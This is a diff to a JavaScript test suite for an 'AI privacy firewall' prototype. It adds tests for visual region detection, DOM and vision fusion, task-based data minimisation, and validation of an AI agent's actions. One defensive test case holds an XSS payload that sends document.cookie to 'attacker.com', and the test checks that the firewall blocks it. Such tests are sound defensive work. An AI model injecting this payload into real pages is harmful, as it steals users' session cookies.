@@ -10,6 +10,10 @@ import { recordEvent, getEvents, EVENT_TYPES } from '../src/core/eventLog.js';
 import { runDetectionBenchmark } from '../src/core/evaluationBenchmark.js';
 import { profileExecution } from '../src/core/profiler.js';
 import { DEMO_STEPS } from '../src/core/demoSteps.js';
+import { processVisualLayout } from '../src/core/visualPerception.js';
+import { fuseContexts } from '../src/core/contextFusion.js';
+import { filterContextForTask } from '../src/core/taskRelevance.js';
+import { validateAgentAction } from '../src/core/actionFirewall.js';
 
 console.log("================================================================================");
 console.log("AI PRIVACY FIREWALL (ISRO SIH26171) — EXTENDED SUITE VERIFICATION");
@@ -185,13 +189,99 @@ assert.strictEqual(vaultRes.transmittedToRemoteAI, false);
 console.log("✓ Vault delegation confirmed zero remote leakage.");
 
 // 11. Test Preservation of 2-Minute Demo Tour (Requirement 12)
-console.log("\n[12/12] Testing Preservation of 2-Minute Demo Tour...");
+console.log("\n[12/16] Testing Preservation of 2-Minute Demo Tour...");
 assert.strictEqual(DEMO_STEPS.length, 9, "Demo tour must contain all 9 sequential steps");
 assert.strictEqual(DEMO_STEPS[0].protected, true);
 assert.strictEqual(DEMO_STEPS[5].view, 'comparison');
 assert.strictEqual(DEMO_STEPS[8].view, 'report');
 console.log("✓ 2-Minute Demo Tour 9-stage sequence verified.");
 
+// 12. V2 Test: Modular Visual Perception Engine
+console.log("\n[13/16] Testing V2 Modular Visual Perception Engine (Spatial Geometry & Vision-only case)...");
+const visualRes = processVisualLayout(mockProfileData);
+assert.strictEqual(typeof visualRes.totalRegions, 'number', "Must return totalRegions count");
+assert(visualRes.regions.length >= 7, "Must segment input regions, buttons, and visual badges");
+
+// Verify spatial bounding box schema
+visualRes.regions.forEach(reg => {
+  assert(reg.id, "Region must have id");
+  assert.strictEqual(reg.source, "VISION", "Source must be strictly VISION");
+  assert(reg.boundingBox, "Must have bounding box");
+  assert(typeof reg.boundingBox.x === 'number' && typeof reg.boundingBox.y === 'number', "Bounding box must have numeric coordinates");
+});
+
+// Verify genuine vision-only confidential seal detection
+const visionOnlySeal = visualRes.regions.find(r => r.type === 'VISUAL_ACCOUNT_SEAL');
+assert(visionOnlySeal, "Must detect visual-only confidential account seal");
+assert.strictEqual(visionOnlySeal.metadata.detectedByVisionOnly, true, "Seal must be marked detectedByVisionOnly");
+console.log("✓ Visual Perception verified: Spatial bounding boxes and vision-only seal detected.");
+
+// 13. V2 Test: Context Fusion Engine (DOM + Vision Agreement)
+console.log("\n[14/16] Testing V2 Context Fusion Engine (Multimodal Evidence & Agreement)...");
+const fusionRes = fuseContexts(detections, visualRes.regions);
+assert(fusionRes.fusedElements.length >= 6, "Must fuse DOM and Vision elements");
+
+// Check Password field fusion (DOM + VISION agreement)
+const passFused = fusionRes.fusedElements.find(e => e.type === 'PASSWORD');
+assert.strictEqual(passFused.source, "DOM + VISION", "Password must have fused DOM + VISION source");
+assert.strictEqual(passFused.agreement, "HIGH", "Password must have HIGH evidence agreement");
+assert(passFused.boundingBox, "Password must contain spatial bounding box from vision");
+
+// Check Vision-only element fusion
+const sealFused = fusionRes.fusedElements.find(e => e.type === 'VISUAL_ACCOUNT_SEAL');
+assert.strictEqual(sealFused.source, "VISION", "Security seal must have VISION source");
+assert.strictEqual(sealFused.agreement, "VISION ONLY", "Seal must have VISION ONLY agreement");
+console.log("✓ Context Fusion verified: Multimodal agreement, DOM vs Vision distinction, and no fake confidence numbers.");
+
+// 14. V2 Test: Task-Aware Minimum Context Engine
+console.log("\n[15/16] Testing V2 Task-Aware Minimum Context (Data Minimization & Fail-Safe)...");
+// Case A: Authentication task
+const authTaskRes = filterContextForTask(fusionRes.fusedElements, "Ask AI to log me in");
+assert.strictEqual(authTaskRes.taskIntent, "AUTHENTICATION");
+
+// Crucial: Sensitivity overrides task relevance (Password must NEVER be raw on wire)
+const authPass = authTaskRes.filteredElements.find(e => e.type === 'PASSWORD');
+assert.strictEqual(authPass.wireStatus, "BLOCKED_FROM_AI", "Password must remain blocked even when relevant to login");
+assert.strictEqual(authPass.transmittedValue, "[PASSWORD]", "Must send safe semantic token [PASSWORD]");
+
+// Case B: Download Report task
+const downloadTaskRes = filterContextForTask(fusionRes.fusedElements, "Download my monthly report");
+assert.strictEqual(downloadTaskRes.taskIntent, "REPORT_DOWNLOAD");
+// Credentials must be pruned/blocked for download tasks
+const downloadEmail = downloadTaskRes.filteredElements.find(e => e.type === 'EMAIL');
+assert.strictEqual(downloadEmail.wireStatus, "PRUNED_BY_MINIMIZATION", "Email must be pruned as irrelevant for download task");
+console.log("✓ Task-Aware Engine verified: Fail-safe minimization and sensitivity priority over task relevance.");
+
+// 15. V2 Test: Dedicated AI Action Firewall Engine
+console.log("\n[16/16] Testing V2 Dedicated AI Action Firewall (Validation & Code Injection Guard)...");
+// Case A: Valid CLICK command
+const validAction = validateAgentAction({ action: "CLICK", target: "Login" });
+assert.strictEqual(validAction.valid, true);
+assert.strictEqual(validAction.decision, "ALLOWED");
+
+// Case B: Malformed action schema
+const malformedAction = validateAgentAction({ action: "", target: null });
+assert.strictEqual(malformedAction.valid, false);
+assert.strictEqual(malformedAction.decision, "BLOCKED");
+
+// Case C: Disallowed action verb
+const dangerousVerb = validateAgentAction({ action: "EXECUTE_SCRIPT", target: "Login" });
+assert.strictEqual(dangerousVerb.valid, false);
+assert.strictEqual(dangerousVerb.decision, "BLOCKED");
+
+// Case D: Arbitrary code injection / XSS attempt
+const injectionAttempt = validateAgentAction({ action: "CLICK", target: "<script>fetch('http://attacker.com?c='+document.cookie)</script>" });
+assert.strictEqual(injectionAttempt.valid, false);
+assert.strictEqual(injectionAttempt.decision, "BLOCKED");
+assert(injectionAttempt.violationReason.includes("Dangerous") || injectionAttempt.violationReason.includes("script"), "Must flag dangerous script injection");
+
+// Case E: Nonexistent target
+const nonexistentTarget = validateAgentAction({ action: "CLICK", target: "unauthorized_admin_drop_database" });
+assert.strictEqual(nonexistentTarget.valid, false);
+assert.strictEqual(nonexistentTarget.decision, "BLOCKED");
+console.log("✓ AI Action Firewall verified: Schema, verb whitelist, injection guard, and target validation passed.");
+
 console.log("\n================================================================================");
-console.log("ALL 12 TEST SUITES PASSED! ALL 17 UPGRADE REQUIREMENTS VERIFIED.");
+console.log("ALL 16 TEST SUITES PASSED! VERSION 2 ENHANCED PROTOTYPE FULLY VERIFIED.");
 console.log("================================================================================");
+
